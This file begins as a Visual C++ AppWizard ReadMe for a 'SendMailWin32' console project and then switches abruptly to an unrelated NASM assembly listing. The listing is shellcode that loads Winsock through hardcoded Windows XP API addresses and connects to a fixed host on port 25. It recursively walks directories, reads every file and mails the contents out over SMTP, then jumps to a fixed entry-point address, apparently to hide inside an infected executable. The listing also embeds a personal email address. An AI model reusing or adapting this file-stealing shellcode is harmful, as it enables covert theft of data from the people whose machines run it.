========================================================================
       CONSOLE APPLICATION : SendMailWin32
========================================================================


AppWizard has created this SendMailWin32 application for you.  

This file contains a summary of what you will find in each of the files that
make up your SendMailWin32 application.

SendMailWin32.dsp
    This file (the project file) contains information at the project level and
    is used to build a single project or subproject. Other users can share the
    project (.dsp) file, but they should export the makefiles locally.

SendMailWin32.cpp
    This is the main application source file.


/////////////////////////////////////////////////////////////////////////////
Other standard files:

StdAfx.h, StdAfx.cpp
    These files are used to build a precompiled header (PCH) file
    named SendMailWin32.pch and a precompiled types file named StdAfx.obj.


/////////////////////////////////////////////////////////////////////////////
Other notes:

AppWizard uses "TODO:" to indicate parts of the source code you
should add to or customize.

/////////////////////////////////////////////////////////////////////////////
     1                                  	bits 32
     2                                  	
     3 00000000 55                      	push	ebp			
     4 00000001 89E5                    	mov		ebp,esp		
     5 00000003 81EC00040000            	sub		esp,400H
     6 00000009 53                      	push	ebx
     7 0000000A 56                      	push	esi
     8 0000000B 57                      	push	edi
     9 0000000C 8DBD00FCFFFF            	lea		edi,[ebp-400H]
    10 00000012 B980000000              	mov		ecx,80H	
    11 00000017 B800000000              	mov		eax,0H				
    12 0000001C F3AB                    	rep		stosd
    13 0000001E E80B000000              	call	$init
    14 00000023 7773325F33322E646C-     	db 		'ws2_32.dll',0
    15 0000002C 6C00               
    16                                  $init:
    17                                  ;	mov		eax, szBuffer
    18                                  ;	push	eax
    19 0000002E B87B1D807C              	mov		eax,7c801d7bH   ;LOADLIBRARY	
    20 00000033 FFD0                    	call	eax
    21                                  $wsasatrtup:
    22 00000035 8D8570FEFFFF            	lea		eax,[ebp-190h]
    23 0000003B 50                      	push 	eax
    24 0000003C 6802020000              	push 	202h
    25 00000041 B8556AAB71              	mov		eax,71AB6A55h
    26 00000046 FFD0                    	call	eax
    27 00000048 85C0                    	test	eax,eax
    28 0000004A 0F8575050000            	jne		$end
    29                                  $socket:
    30 00000050 6A00                    	push	0
    31 00000052 6A01                    	push	1
    32 00000054 6A02                    	push	2
    33 00000056 B81142AB71              	mov		eax, 71ab4211h
    34 0000005B FFD0                    	call	eax							;socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
    35 0000005D 8945E0                  	mov		[ebp-20h],eax
    36 00000060 B8FF000000              	mov		eax,0FFh
    37 00000065 3945E0                  	cmp     [ebp-20h],eax	;if(server == -1)
    38 00000068 7507                    	jne     $connect 
    39 0000006A 31C0                    	xor     eax,eax
    40 0000006C E94A050000              	jmp     $WSACleanup	
    41                                  $connect:
    42 00000071 66B80200                	mov		ax, 0002h
    43 00000075 668945D8                	mov		[ebp-20h-8h], ax
    44 00000079 B80A0A0109              	mov		eax, 9010A0Ah
    45 0000007E 8945DC                  	mov		[ebp-20h-4h], eax
    46 00000081 66B80019                	mov		ax, 1900h
    47 00000085 668945DA                	mov		[ebp-20h-6h], ax
    48 00000089 6A10                    	push	10h					; push
    49 0000008B 8D4DD8                  	lea		ecx,[ebp-20h-8h]
    50 0000008E 51                      	push 	ecx
    51 0000008F 8B45E0                  	mov		eax, [ebp-20h]
    52 00000092 50                      	push 	eax
    53 00000093 B8074AAB71              	mov		eax, 71ab4a07h		; connect
    54 00000098 FFD0                    	call	eax
    55                                  	
    56 0000009A 8945D4                  	mov		[ebp-20h-8h-4h],eax	;nRet
    57 0000009D B800000000              	mov		eax, 0H
    58 000000A2 3945D4                  	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 0)
    59 000000A5 0F8502050000            	jne     $closesocket 
    60                                  ;First:sendprepare
    61 000000AB 8B45E0                  	mov		eax,[ebp-20h]
    62 000000AE 50                      	push	eax
    63 000000AF E820000000              	call	$sendprepare
    64 000000B4 83C404                  	add		esp,4
    65                                  ;Second:sendfile
    66 000000B7 8B45E0                  	mov		eax,[ebp-20h]
    67 000000BA 50                      	push	eax
    68 000000BB E868000000              	call	$sendfilemain
    69 000000C0 83C404                  	add		esp,4
    70                                  ;Third:sendExit
    71 000000C3 8B45E0                  	mov		eax,[ebp-20h]
    72 000000C6 50                      	push	eax
    73 000000C7 E89D040000              	call	$sendExit
    74 000000CC 83C404                  	add		esp,4
    75 000000CF E9D9040000              	jmp		$closesocket
    76                                  $sendprepare:
    77 000000D4 55                      	push	ebp			
    78 000000D5 89E5                    	mov		ebp,esp		
    79 000000D7 81EC00020000            	sub		esp,200H
    80 000000DD 53                      	push	ebx
    81 000000DE 56                      	push	esi
    82 000000DF 57                      	push	edi
    83 000000E0 8DBD00FEFFFF            	lea		edi, [ebp-200H]
    84 000000E6 B940000000              	mov		ecx,40H	
    85 000000EB B800000000              	mov		eax, 0H				
    86 000000F0 F3AB                    	rep		stosd
    87                                  	
    88 000000F2 BB[D8050000]            	mov		ebx, szPrepare
    89 000000F7 01F3                    	add		ebx, esi
    90 000000F9 53                      	push	ebx			;szPrepare	
    91 000000FA B84526907C              	mov		eax,7c902645H
    92 000000FF FFD0                    	call	eax
    93 00000101 83C404                  	add		esp, 4
    94 00000104 8945FC                  	mov		[ebp-4H],eax
    95                                  	
    96 00000107 B800000000              	mov		eax, 0H
    97 0000010C 50                      	push	eax
    98 0000010D 8B45FC                  	mov		eax, [ebp-4H]
    99 00000110 50                      	push	eax
   100 00000111 53                      	push	ebx			;szPrepare	
   101 00000112 8B4508                  	mov		eax, [ebp+8]
   102 00000115 50                      	push	eax
   103 00000116 B8274CAB71              	mov		eax, 71ab4c27H
   104 0000011B FFD0                    	call	eax					;send(server, szBuffer, strlen(szBuffer), 0);
   105                                  
   106 0000011D 5F                      	pop		edi
   107 0000011E 5E                      	pop		esi
   108 0000011F 5B                      	pop		ebx
   109 00000120 81C400020000            	add		esp,200H
   110 00000126 5D                      	pop     ebp	
   111 00000127 C3                      	ret
   112                                  ;;;;;;;;;;;;;;;;;;
   113                                  $sendfilemain:	;1)searchfile 2)sendfile
   114 00000128 55                      	push	ebp			
   115 00000129 89E5                    	mov		ebp,esp		
   116 0000012B 83EC0C                  	sub		esp,0CH
   117 0000012E 53                      	push	ebx
   118 0000012F 56                      	push	esi
   119 00000130 57                      	push	edi
   120 00000131 8D7DF4                  	lea		edi, [ebp-0CH]
   121 00000134 B903000000              	mov		ecx,3H	
   122 00000139 B800000000              	mov		eax, 0H				
   123 0000013E F3AB                    	rep		stosd
   124                                  
   125 00000140 8B4508                  	mov		eax, [ebp+8]
   126 00000143 50                      	push	eax		;server
   127 00000144 BB[F0060000]            	mov		ebx,szFilter
   128 00000149 01F3                    	add		ebx, esi
   129 0000014B 53                      	push	ebx
   130 0000014C BB[F6060000]            	mov		ebx, szPath
   131 00000151 01F3                    	add 	ebx, esi
   132 00000153 53                      	push	ebx
   133 00000154 E808000000              	call	$searchfile 
   134 00000159 83C40C                  	add		esp, 12
   135 0000015C E9FE030000              	jmp		$_END
   136                                  $searchfile:
   137 00000161 55                      	push	ebp			
   138 00000162 89E5                    	mov		ebp,esp		
   139 00000164 81EC00040000            	sub		esp,400H
   140 0000016A 53                      	push	ebx
   141 0000016B 56                      	push	esi
   142 0000016C 57                      	push	edi
   143 0000016D 8DBD00FEFFFF            	lea		edi, [ebp-200H]
   144 00000173 B980000000              	mov		ecx,80H	; 
   145 00000178 B800000000              	mov		eax, 0H				
   146 0000017D F3AB                    	rep		stosd
   147                                  
   148 0000017F 8B4508                  	mov		eax,[ebp+8]		; strPath
   149 00000182 8B5D0C                  	mov		ebx,[ebp+12]	; strFilter
   150                                  	
   151 00000185 B900000000              	mov		ecx,0H			
   152 0000018A 39C8                    	cmp		eax, ecx
   153 0000018C 0F84D4010000            	je		_searchfileend	; strPath == NULL 
   154 00000192 39CB                    	cmp		ebx, ecx
   155 00000194 0F84CC010000            	je		_searchfileend	; strFilter == NULL
   156                                  _findfile:
   157                                  	;sprintf(szFilePath, "%s%s",strPath, strFilter);		
   158 0000019A 8D8DFCFEFFFF            	lea		ecx, [ebp-104h]				;TCHAR szFilePath[MAX_PATH] 
   159 000001A0 53                      	push	ebx
   160 000001A1 50                      	push	eax
   161 000001A2 51                      	push    ecx
   162 000001A3 E8C9010000              	call	$sprintf
   163 000001A8 83C40C                  	add		esp,12
   164                                  
   165                                  	;long handle = (long)::FindFirstFile(szFilePath, &findData);
   166 000001AB 8D85BCFDFFFF            	lea		eax, [ebp-140h-104h]		;$findData
   167 000001B1 50                      	push    eax
   168 000001B2 8D85FCFEFFFF            	lea		eax, [ebp-104h]				;$szFilePath
   169 000001B8 50                      	push	eax	
   170 000001B9 B8F9F9827C              	mov		eax, 7c82f9f9H
   171 000001BE FFD0                    	call	eax
   172 000001C0 8985B8FDFFFF            	mov		[ebp-104h-140h-4H],eax		;$handle 0x00148968
   173                                  
   174                                  	;if(handle != 0xFFFFFFFF)
   175 000001C6 BBFFFFFFFF              	mov		ebx, 0FFFFFFFFH
   176 000001CB 3B9DB8FDFFFF            	cmp		ebx, [ebp-104h-140h-4H]			;
   177 000001D1 0F848F000000            	je		_finddir
   178                                  	
   179                                  	;BOOL bRet = TRUE;
   180 000001D7 8D85B4FDFFFF            	lea		eax, [ebp-104h-140h-4H-4H]	
   181 000001DD B801000000              	mov		eax, 1	
   182 000001E2 8985B4FDFFFF            	mov		[ebp-104h-140h-4H-4H], eax
   183                                  _findfile_while:
   184                                  	;memset(szFilePath, 0x00, MAX_PATH);
   185 000001E8 6804010000              	push    104H	
   186 000001ED 8D85FCFEFFFF            	lea		eax,  [ebp-104h]
   187 000001F3 50                      	push    eax
   188 000001F4 E8B6010000              	call	$memset
   189 000001F9 83C408                  	add		esp, 8
   190                                  	
   191                                  	;sprintf(szFilePath, "%s\\%s",strPath, findData.cFileName);
   192 000001FC 8D85E8FDFFFF            	lea		eax, [ebp-104h-114H]		;$findData.cFileName
   193 00000202 50                      	push    eax		
   194 00000203 8B4508                  	mov		eax, [ebp+8]				
   195 00000206 50                      	push    eax						; strPath
   196 00000207 8D85FCFEFFFF            	lea		eax, [ebp-104h]					;$szFilePath
   197 0000020D 50                      	push	eax	 
   198 0000020E E85E010000              	call    $sprintf
   199 00000213 83C40C                  	add		esp, 12
   200                                  	
   201 00000216 8B4510                  	mov		eax, [ebp+16]
   202 00000219 50                      	push	eax		;server
   203 0000021A 8D85FCFEFFFF            	lea		eax, [ebp-104h]					;$szFilePath
   204 00000220 50                      	push	eax	 
   205 00000221 8D85E8FDFFFF            	lea		eax, [ebp-104h-114H]			;$findData.cFileName
   206 00000227 50                      	push    eax	
   207 00000228 E8B6010000              	call	$sendfile
   208 0000022D 83C40C                  	add		esp, 12
   209                                  _findfile_next:
   210                                  	;bRet = FindNextFile((HANDLE)handle, &findData);
   211 00000230 8D85BCFDFFFF            	lea		eax, [ebp-140h-104h]		;$findData
   212 00000236 50                      	push    eax
   213 00000237 8B85B8FDFFFF            	mov		eax,[ebp-104h-140h-4H]
   214 0000023D 50                      	push    eax			;handle
   215 0000023E B8514F837C              	mov		eax, 7c834f51H
   216 00000243 FFD0                    	call    eax
   217 00000245 8985B4FDFFFF            	mov     [ebp-104h-140h-4H-4H], eax	;bRet
   218 0000024B B801000000              	mov		eax, 1
   219 00000250 3B85B4FDFFFF            	cmp		eax, [ebp-104h-140h-4H-4H]
   220 00000256 7490                    	je		_findfile_while
   221                                  _findfile_close:
   222                                  	;FindClose((HANDLE)handle);
   223 00000258 8B85E8FDFFFF            	mov		eax, [ebp-104h-114H]
   224 0000025E 50                      	push	eax
   225 0000025F B89CEE807C              	mov		eax, 7c80ee9cH
   226 00000264 FFD0                    	call	eax	
   227                                  _finddir:
   228 00000266 B801000000              	mov 	eax,1
   229 0000026B 8985B4FDFFFF            	mov     [ebp-104h-140h-4H-4H], eax	;bRet
   230                                  	;memset(szFilePath, 0x00, MAX_PATH);
   231 00000271 6804010000              	push    104H	
   232 00000276 8D85FCFEFFFF            	lea		eax,  [ebp-104h]
   233 0000027C 50                      	push    eax
   234 0000027D E82D010000              	call	$memset
   235 00000282 83C408                  	add		esp, 8
   236                                  	;sprintf(szFilePath, "%s%s",strPath, AllFile);
   237 00000285 BB[02070000]            	mov		ebx, AllFile
   238 0000028A 01F3                    	add		ebx, esi
   239 0000028C 53                      	push	ebx
   240 0000028D 8B4508                  	mov		eax, [ebp+8]			
   241 00000290 50                      	push    eax							; strPath
   242 00000291 8D85FCFEFFFF            	lea		eax, [ebp-104h]					;$szFilePath
   243 00000297 50                      	push	eax	 
   244 00000298 E8D4000000              	call    $sprintf
   245 0000029D 83C40C                  	add		esp, 12
   246                                  	;handle = (long)::FindFirstFile(szFilePath, &findData);
   247 000002A0 8D85BCFDFFFF            	lea		eax, [ebp-140h-104h]		;$findData
   248 000002A6 50                      	push    eax
   249 000002A7 8D85FCFEFFFF            	lea		eax, [ebp-104h]				;$szFilePath
   250 000002AD 50                      	push	eax	
   251 000002AE B8F9F9827C              	mov		eax, 7c82f9f9H
   252 000002B3 FFD0                    	call	eax
   253 000002B5 8985B8FDFFFF            	mov		[ebp-104h-140h-4H],eax		;$handle 0x00148968
   254                                  	;if(handle != 0xFFFFFFFF)
   255 000002BB BBFFFFFFFF              	mov		ebx, 0FFFFFFFFH
   256 000002C0 3B9DB8FDFFFF            	cmp		ebx, [ebp-104h-140h-4H]			;
   257 000002C6 0F849A000000            	je		_searchfileend
   258                                  _finddir_while:
   259 000002CC 8B85BCFDFFFF            	mov		eax, [ebp-104h-140H]		;findData.dwFileAttributes 
   260 000002D2 83E010                  	and		eax, 00000010H
   261 000002D5 7455                    	je		_finddir_next
   262 000002D7 8AA5E8FDFFFF            	mov		AH, [ebp-104h-114H]
   263 000002DD B02E                    	mov		AL, 2EH
   264 000002DF 38C4                    	cmp		AH,AL
   265 000002E1 7449                    	je		_finddir_next
   266                                  	;memset(szFilePath, 0x00, MAX_PATH);
   267 000002E3 6804010000              	push    104H	
   268 000002E8 8D85FCFEFFFF            	lea		eax,  [ebp-104h]
   269 000002EE 50                      	push    eax
   270 000002EF E8BB000000              	call	$memset
   271 000002F4 83C408                  	add		esp, 8
   272                                  	;sprintf(szFilePath, "%s%s",strPath, findData.cFileName);
   273 000002F7 8D85E8FDFFFF            	lea		eax, [ebp-104h-114H]			;$findData.cFileName
   274 000002FD 50                      	push    eax		
   275 000002FE 8B4508                  	mov		eax,[ebp+8]			
   276 00000301 50                      	push    eax							; strPath
   277 00000302 8D85FCFEFFFF            	lea		eax, [ebp-104h]					;$szFilePath
   278 00000308 50                      	push	eax	 
   279 00000309 E863000000              	call    $sprintf
   280 0000030E 83C40C                  	add		esp, 12
   281                                  
   282 00000311 8B4510                  	mov		eax,[ebp+16]
   283 00000314 50                      	push	eax			;server
   284 00000315 BB[F0060000]            	mov		ebx,szFilter
   285 0000031A 01F3                    	add		ebx, esi	
   286 0000031C 53                      	push	ebx
   287 0000031D 8D85FCFEFFFF            	lea		eax, [ebp-104h]	
   288 00000323 50                      	push	eax
   289 00000324 E838FEFFFF              	call	$searchfile
   290 00000329 83C40C                  	add		esp, 12
   291                                  _finddir_next:
   292 0000032C 8D85BCFDFFFF            	lea		eax, [ebp-140h-104h]		;$findData
   293 00000332 50                      	push    eax
   294 00000333 8B85B8FDFFFF            	mov		eax, [ebp-104h-140h-4H]
   295 00000339 50                      	push    eax			;handle
   296 0000033A B8514F837C              	mov		eax, 7c834f51H
   297 0000033F FFD0                    	call    eax
   298 00000341 8985B4FDFFFF            	mov     [ebp-104h-140h-4H-4H], eax	;bRet
   299 00000347 B801000000              	mov		eax, 1
   300 0000034C 3B85B4FDFFFF            	cmp		eax, [ebp-104h-140h-4H-4H]
   301 00000352 0F8474FFFFFF            	je		_finddir_while
   302                                  _finddir_close:
   303                                  	;FindClose((HANDLE)handle);
   304 00000358 8B85E8FDFFFF            	mov		eax, [ebp-104h-114H]
   305 0000035E 50                      	push	eax
   306 0000035F B89CEE807C              	mov		eax, 7c80ee9cH
   307 00000364 FFD0                    	call	eax	
   308                                  _searchfileend:
   309 00000366 5F                      	pop		edi
   310 00000367 5E                      	pop		esi
   311 00000368 5B                      	pop		ebx
   312 00000369 81C400040000            	add     esp, 400H
   313 0000036F 5D                      	pop		ebp
   314 00000370 C3                      	ret
   315                                  $sprintf:
   316 00000371 55                      	push	ebp			
   317 00000372 89E5                    	mov		ebp,esp			
   318 00000374 83EC0C                  	sub		esp,0CH		
   319 00000377 53                      	push	ebx
   320 00000378 56                      	push	esi
   321 00000379 57                      	push	edi
   322 0000037A 8D7DF4                  	lea		edi, [ebp-0CH]
   323 0000037D B903000000              	mov		ecx, 3H	
   324 00000382 B800000000              	mov		eax, 0H				
   325 00000387 F3AB                    	rep		stosd
   326                                  
   327 00000389 8B4510                  	mov		eax,[ebp+16]	;strFilter
   328 0000038C 50                      	push	eax
   329 0000038D 8B450C                  	mov		eax,[ebp+12]	;strPath
   330 00000390 50                      	push	eax
   331 00000391 BB[09070000]            	mov		ebx, szData01
   332 00000396 01F3                    	add		ebx, esi
   333 00000398 53                      	push	ebx				;"%s%s"
   334 00000399 8B4508                  	mov		eax,[ebp+8]		;szFilePath
   335 0000039C 50                      	push	eax
   336                                  	
   337 0000039D B8B445927C              	mov		eax,7c9245b4H	
   338 000003A2 FFD0                    	call	eax				;sprintf(szFilePath, "%s\%s",strPath, strFilter);
   339 000003A4 83C410                  	add		esp, 16
   340                                  
   341 000003A7 5F                      	pop		edi
   342 000003A8 5E                      	pop		esi
   343 000003A9 5B                      	pop		ebx
   344 000003AA 83C40C                  	add		esp, 0CH
   345 000003AD 5D                      	pop     ebp			
   346 000003AE C3                      	ret
   347                                  $memset:
   348 000003AF 55                      	push	ebp			
   349 000003B0 89E5                    	mov		ebp,esp			
   350 000003B2 83EC0C                  	sub		esp,0CH		
   351 000003B5 53                      	push	ebx
   352 000003B6 56                      	push	esi
   353 000003B7 57                      	push	edi
   354 000003B8 8D7DF4                  	lea		edi, [ebp-0CH]
   355 000003BB B903000000              	mov		ecx, 3H	
   356 000003C0 B800000000              	mov		eax, 0H				
   357 000003C5 F3AB                    	rep		stosd
   358                                  
   359 000003C7 8B450C                  	mov		eax,[ebp+12]	;MAX_PATH
   360 000003CA 50                      	push	eax
   361 000003CB 6A00                    	push	0
   362 000003CD 8B4508                  	mov		eax,[ebp+8]		;szFilePath
   363 000003D0 50                      	push	eax
   364 000003D1 B83524907C              	mov		eax,7c902435H	
   365 000003D6 FFD0                    	call	eax				;memset(szFilePath, 0x00, MAX_PATH);
   366 000003D8 83C40C                  	add		esp, 12
   367                                  
   368 000003DB 5F                      	pop		edi
   369 000003DC 5E                      	pop		esi
   370 000003DD 5B                      	pop		ebx
   371 000003DE 83C40C                  	add		esp, 0CH
   372 000003E1 5D                      	pop     ebp			
   373 000003E2 C3                      	ret
   374                                  $sendfile:
   375 000003E3 55                      	push	ebp			
   376 000003E4 89E5                    	mov		ebp,esp			
   377 000003E6 81EC00020000            	sub		esp,200H		
   378 000003EC 53                      	push	ebx
   379 000003ED 56                      	push	esi
   380 000003EE 57                      	push	edi
   381 000003EF 8DBD00FEFFFF            	lea		edi, [ebp-200H]
   382 000003F5 B940000000              	mov		ecx, 40H	
   383 000003FA B800000000              	mov		eax, 0H				
   384 000003FF F3AB                    	rep		stosd
   385                                  
   386                                  	;Sleep(1);
   387 00000401 B801000000              	mov		eax, 1h
   388 00000406 50                      	push	eax
   389 00000407 B84624807C              	mov		eax, 7c802446H
   390 0000040C FFD0                    	call	eax				
   391                                  	
   392                                  	;sprintf(szBuffer, DATA_FILE2, strFileName);
   393 0000040E 8B4508                  	mov		eax,[ebp+8]
   394 00000411 50                      	push	eax
   395 00000412 BB[0F070000]            	mov		ebx, szDataFile
   396 00000417 01F3                    	add		ebx, esi
   397 00000419 53                      	push	ebx
   398 0000041A 8D85FCFEFFFF            	lea		eax, [ebp-104H]
   399 00000420 50                      	push	eax
   400 00000421 B8B445927C              	mov		eax, 7c9245b4H	
   401 00000426 FFD0                    	call	eax
   402 00000428 83C40C                  	add		esp, 12
   403                                  
   404 0000042B 8D85FCFEFFFF            	lea		eax, [ebp-104H]
   405 00000431 50                      	push	eax
   406 00000432 B84526907C              	mov		eax,7c902645H
   407 00000437 FFD0                    	call	eax
   408 00000439 83C404                  	add		esp, 4
   409 0000043C 8985F8FEFFFF            	mov		[ebp-104H-4H],eax
   410                                  
   411 00000442 6A00                    	push	0
   412 00000444 8B85F8FEFFFF            	mov		eax, [ebp-104H-4H]
   413 0000044A 50                      	push	eax
   414 0000044B 8D85FCFEFFFF            	lea		eax, [ebp-104H]
   415 00000451 50                      	push	eax
   416 00000452 8B4510                  	mov		eax,[ebp+16]
   417 00000455 50                      	push	eax		;server
   418 00000456 B8274CAB71              	mov		eax, 71ab4c27H
   419 0000045B FFD0                    	call	eax					;send(server, szBuffer, strlen(szBuffer), 0);	
   420                                  _sendvalue:
   421                                  	;HANDLE handle = CreateFile(strFilePath, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   422 0000045D 6A00                    	push	0
   423 0000045F 6880000000              	push	00000080H
   424 00000464 6A03                    	push	3
   425 00000466 6A00                    	push	0
   426 00000468 6A01                    	push	1
   427 0000046A 6800000080              	push	80000000H
   428 0000046F 8B450C                  	mov		eax,[ebp+12]
   429 00000472 50                      	push	eax
   430 00000473 B8281A807C              	mov		eax,7c801a28H
   431 00000478 FFD0                    	call	eax
   432 0000047A 8985F4FEFFFF            	mov		[ebp-104H-4H-4H], eax	;handle
   433                                  	;if(handle != INVALID_HANDLE_VALUE)
   434 00000480 B8FFFFFFFF              	mov		eax, 0FFFFFFFFH
   435 00000485 3B85F4FEFFFF            	cmp		eax, [ebp-104H-4H-4H]
   436 0000048B 0F84A6000000            	je		_sendfile_end
   437                                  	
   438                                  	;memset(szFilePath, 0x00, MAX_PATH);
   439 00000491 6804010000              	push    104H	
   440 00000496 8D85FCFEFFFF            	lea		eax,  [ebp-104h]
   441 0000049C 50                      	push    eax
   442 0000049D E80DFFFFFF              	call	$memset
   443 000004A2 83C408                  	add		esp, 8
   444                                  	;DWORD nRead 
   445                                  	;BOOL bRet = ReadFile(handle, szBuffer, MAX_PATH, &nRead, NULL);
   446 000004A5 6A00                    	push	0
   447 000004A7 8D85F0FEFFFF            	lea		eax, [ebp-104H-4H-4H-4H]	;nRead
   448 000004AD 50                      	push	eax								
   449 000004AE 6804010000              	push	104H						;MAX_PATH
   450 000004B3 8D85FCFEFFFF            	lea		eax,  [ebp-104h]			;szBuffer
   451 000004B9 50                      	push    eax
   452 000004BA 8B85F4FEFFFF            	mov		eax, [ebp-104H-4H-4H]
   453 000004C0 50                      	push	eax							;handle
   454 000004C1 B81218807C              	mov		eax, 7c801812H
   455 000004C6 FFD0                    	call	eax
   456 000004C8 8985ECFEFFFF            	mov		[ebp-104H-4H-4H-4H-4H],eax	;bRet
   457                                  _sendfile_while:
   458                                  	;while(bRet && nRead > 0)
   459 000004CE B800000000              	mov		eax, 0
   460 000004D3 3B85ECFEFFFF            	cmp		eax, [ebp-104H-4H-4H-4H-4H]		;bRet
   461 000004D9 744E                    	je		_closehandle
   462 000004DB 3B85F0FEFFFF            	cmp		eax, [ebp-104H-4H-4H-4H]		;nRead
   463 000004E1 7346                    	JAE		_closehandle
   464                                  
   465                                  	;nRet = send(server, szBuffer, nRead, 0);
   466 000004E3 6A00                    	push	0
   467 000004E5 8B85F0FEFFFF            	mov		eax,  [ebp-104H-4H-4H-4H]
   468 000004EB 50                      	push	eax
   469 000004EC 8D85FCFEFFFF            	lea		eax,  [ebp-104h]
   470 000004F2 50                      	push    eax
   471 000004F3 8B4510                  	mov		eax, [ebp+16]
   472 000004F6 50                      	push	eax		;server
   473 000004F7 B8274CAB71              	mov		eax,71ab4c27H
   474 000004FC FFD0                    	call	eax
   475                                  	;BOOL bRet = ReadFile(handle, szBuffer, MAX_PATH, &nRead, NULL);
   476 000004FE 6A00                    	push	0
   477 00000500 8D85F0FEFFFF            	lea		eax, [ebp-104H-4H-4H-4H]
   478 00000506 50                      	push	eax			
   479 00000507 6804010000              	push	104H
   480 0000050C 8D85FCFEFFFF            	lea		eax,  [ebp-104h]			;szBuffer
   481 00000512 50                      	push    eax	
   482 00000513 8B85F4FEFFFF            	mov		eax, [ebp-104H-4H-4H]		
   483 00000519 50                      	push	eax			;handle
   484 0000051A B81218807C              	mov		eax,7c801812H
   485 0000051F FFD0                    	call	eax					
   486 00000521 8985ECFEFFFF            	mov		[ebp-104H-4H-4H-4H-4H],eax	;bRet
   487 00000527 EBA5                    	jmp		_sendfile_while
   488                                  _closehandle:
   489 00000529 8B85F4FEFFFF            	mov		eax, [ebp-104H-4H-4H]
   490 0000052F 50                      	push	eax			;handle
   491 00000530 B8E79B807C              	mov		eax, 0x7c809be7
   492 00000535 FFD0                    	call	eax
   493                                  _sendfile_end:
   494 00000537 6A00                    	push	0
   495 00000539 6A02                    	push	2
   496 0000053B BB[06070000]            	mov		ebx, szData3		
   497 00000540 01F3                    	add 	ebx, esi
   498 00000542 53                      	push	ebx
   499 00000543 8B4510                  	mov		eax,[ebp+16]
   500 00000546 50                      	push	eax			;server
   501 00000547 B8274CAB71              	mov		eax, 71ab4c27H
   502 0000054C FFD0                    	call	eax
   503 0000054E 8985F8FEFFFF            	mov		[ebp-104H-4H],eax
   504                                  	
   505 00000554 5F                      	pop		edi
   506 00000555 5E                      	pop		esi
   507 00000556 5B                      	pop		ebx
   508 00000557 81C400020000            	add		esp, 200H
   509 0000055D 5D                      	pop     ebp			
   510 0000055E C3                      	ret
   511                                  $_END:	
   512 0000055F 5F                      	pop		edi
   513 00000560 5E                      	pop		esi
   514 00000561 5B                      	pop		ebx
   515 00000562 83C40C                  	add		esp,0CH
   516 00000565 89EC                    	mov		esp, ebp
   517 00000567 5D                      	pop     ebp	
   518 00000568 C3                      	ret
   519                                  ;;;;;;;;;;;;;;;;;
   520                                  $sendExit: 	
   521 00000569 55                      	push	ebp			
   522 0000056A 89E5                    	mov		ebp,esp			
   523 0000056C 83EC0C                  	sub		esp,0CH		
   524 0000056F 53                      	push	ebx
   525 00000570 56                      	push	esi
   526 00000571 57                      	push	edi
   527 00000572 8D7DF4                  	lea		edi, [ebp-0CH]
   528 00000575 B903000000              	mov		ecx, 3H	
   529 0000057A B800000000              	mov		eax, 0H				
   530 0000057F F3AB                    	rep		stosd
   531                                  
   532 00000581 6A00                    	push	0
   533 00000583 6A09                    	push	09H
   534 00000585 BB[E6060000]            	mov		ebx, szQuit
   535 0000058A 01F3                    	add		ebx, esi
   536 0000058C 53                      	push	ebx
   537 0000058D 8B4508                  	mov		eax, [ebp+8H]
   538 00000590 50                      	push	eax
   539 00000591 B8274CAB71              	mov		eax, 71ab4c27H
   540 00000596 FFD0                    	call	eax
   541 00000598 8945D4                  	mov		[ebp-20h-8h-4h],eax		;nRet
   542 0000059B B809000000              	mov		eax, 09H
   543 000005A0 3945D4                  	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 06H)
   544 000005A3 7508                    	jne     $closesocket
   545                                  
   546 000005A5 5F                      	pop		edi
   547 000005A6 5E                      	pop		esi
   548 000005A7 5B                      	pop		ebx
   549 000005A8 83C40C                  	add		esp, 0CH
   550 000005AB 5D                      	pop     ebp			
   551 000005AC C3                      	ret
   552                                  $closesocket: 
   553 000005AD 8B45E0                  	mov		eax, [ebp-20h]
   554 000005B0 50                      	push	eax	
   555 000005B1 B82B3EAB71              	mov		eax, 0x71ab3e2b
   556 000005B6 FFD0                    	call	eax
   557 000005B8 8945D4                  	mov		[ebp-20h-8h-4h],eax		;nRet
   558                                  $WSACleanup: 
   559 000005BB B8ED3FAB71              	mov		eax, 0x71ab3fed
   560 000005C0 FFD0                    	call	eax
   561 000005C2 8945D4                  	mov		[ebp-20h-8h-4h],eax		;nRet
   562                                  $end:
   563 000005C5 5F                      	pop		edi
   564 000005C6 5E                      	pop		esi
   565 000005C7 5B                      	pop		ebx
   566 000005C8 81C400040000            	add		esp,400H
   567 000005CE 89EC                    	mov		esp, ebp
   568 000005D0 5D                      	pop     ebp	
   569 000005D1 B8501F4000                	mov		eax,00401f50H	
   570 000005D6 FFE0                      	jmp		eax	
   571 000005D8 48454C4F2031302E31-     szPrepare	db		'HELO 10.10.1.9', 0DH, 0AH,	'AUTO LOGIN', 0DH, 0AH,	'MAIL FROM: <liujiquan@ase.com.cn>', 0DH, 0AH,	'RCPT TO: <liujiquan@ase.com.cn>', 0DH, 0AH,'DATA', 0DH, 0AH,'From: <liujiquan@ase.com.cn>', 0DH, 0AH,
   572 000005E1 302E312E390D0A4155-
   573 000005EA 544F204C4F47494E0D-
   574 000005F3 0A4D41494C2046524F-
   575 000005FC 4D3A203C6C69756A69-
   576 00000605 7175616E406173652E-
   577 0000060E 636F6D2E636E3E0D0A-
   578 00000617 5243505420544F3A20-
   579 00000620 3C6C69756A69717561-
   580 00000629 6E406173652E636F6D-
   581 00000632 2E636E3E0D0A444154-
   582 0000063B 410D0A46726F6D3A20-
   583 00000644 3C6C69756A69717561-
   584 0000064D 6E406173652E636F6D-
   585 00000656 2E636E3E0D0A546F3A-
   586 0000065F 203C6C69756A697175-
   587 00000668 616E406173652E636F-
   588 00000671 6D2E636E3E0D0A4461-
   589 0000067A 74653A20323031342F-
   590 00000683 30392F32362031313A-
   591 0000068C 31360D0A5375626A65-
   592 00000695 63743A4F6E65204D61-
   593 0000069E 696C0D0A4D696D652D-
   594 000006A7 56657273696F6E3A20-
   595 000006B0 312E300D0A436F6E74-
   596 000006B9 656E742D547970653A-
   597 000006C2 206D756C7469706172-
   598 000006CB 742F6D697865643B20-
   599 000006D4 626F756E646172793D-
   600 000006DD 22494E5654220D0A00 
   601 000006E6 2E0D0A515549540D0A-     szQuit		db		'.'	,0DH ,0AH,'QUIT',0DH ,0AH,0H
   602 000006EF 00                 
